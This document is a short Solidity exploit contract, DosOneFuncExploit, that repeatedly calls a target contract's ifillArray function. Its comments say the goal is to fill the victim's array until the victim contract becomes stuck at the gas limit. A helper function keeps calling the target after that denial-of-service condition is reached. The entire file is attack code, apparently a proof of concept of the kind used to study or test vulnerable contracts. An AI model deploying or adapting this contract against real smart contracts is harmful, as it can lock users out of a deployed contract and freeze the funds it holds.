pragma solidity ^0.4.25;

interface IVulnerable {
    function ifillArray() external returns (bool);
}

contract DosOneFuncExploit {
    IVulnerable public target;

    constructor(address _target) public {
        target = IVulnerable(_target);
    }

    function attack(uint numCalls) public {
        // This function tries to fill up the array by calling `ifillArray` repeatedly.
        // Once it's full, the victim contract is stuck due to gas limit.
        for (uint i = 0; i < numCalls; i++) {
            require(target.ifillArray(), "ifillArray failed (gas limit hit)");
        }
    }

    // Helper to drain further gas or monitor failure threshold
    function forceFailure() public returns (bool) {
        // Try calling again after DoS condition triggered
        return target.ifillArray();
    }
}

